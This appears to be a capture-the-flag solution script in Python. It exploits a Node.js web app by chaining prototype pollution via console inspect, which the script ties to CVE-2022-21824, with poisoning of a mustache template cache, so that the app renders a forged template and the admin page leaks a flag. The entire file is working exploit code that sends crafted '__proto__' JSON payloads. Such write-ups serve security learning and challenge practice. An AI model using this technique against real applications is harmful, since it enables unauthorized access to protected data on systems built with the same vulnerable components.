import requests
import json
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", 8002)
USERNAME = os.getenv("BASIC_USERNAME", "guest")
PASSWORD = os.getenv("BASIC_PASSWORD", "guest")

with open("../distfiles/views/admin.html", "r") as f:
    template = f.read()

auth = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)

# 0. Put something to table
r = requests.post(f"http://{HOST}:{PORT}/new",
                  auth=auth)

# 1. Object.prototype["0"] = ""    (CVE-2022-21824)
r = requests.get(f"http://{HOST}:{PORT}/show",
                 headers={"Content-Type": "application/json"},
                 data=json.dumps({"debug": True, "inspect": ["__proto__"]}),
                 auth=auth)

# 2. Object.prototype[<mustache cache>] = <fake template token>
# I believe this is a new technique to abuse many of the tempate engines :)
cache_key = template + ":{{:}}"
cache_val = [["name", "flag", 0, 100]]
r = requests.post(f"http://{HOST}:{PORT}/edit",
                  headers={"Content-Type": "application/json"},
                  data=json.dumps({"ip": "__proto__",
                                   "index": cache_key,
                                   "memo": cache_val}),
                  auth=auth)

# 3. Render polluted cache
r = requests.get(f"http://{HOST}:{PORT}/admin", auth=auth)
print(r.text)
